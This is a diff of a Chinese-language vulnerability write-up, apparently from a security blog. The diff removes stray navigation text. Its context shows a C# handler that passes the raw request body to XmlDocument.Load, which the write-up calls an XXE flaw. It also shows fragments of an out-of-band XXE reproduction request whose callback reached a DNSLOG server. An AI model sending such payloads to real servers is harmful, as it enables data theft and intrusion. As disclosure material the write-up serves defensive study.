@@ -32,14 +32,6 @@ protected void Page_Load(object sender, EventArgs e)
   ((XmlDocument) xmlDataDocument).Load(this.Request.InputStream);
 ```
 
-深入探索
-
-网络
-
-企业技术
-
-计算机服务器
-
 请求内容直接使 `XmlDocument.Load` 解析，造成[XXE](https://mrxn.net/tag/XXE)[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")。
 
 # 漏洞复现
@@ -57,14 +49,6 @@ Content-Type: application/xml
 %remote;]>
 <root/>
 ```
-
-深入探索
-
-网络安全
-
-软件
-
-数据管理
 
 在DNSLOG平台成功收到HTTP请求
 
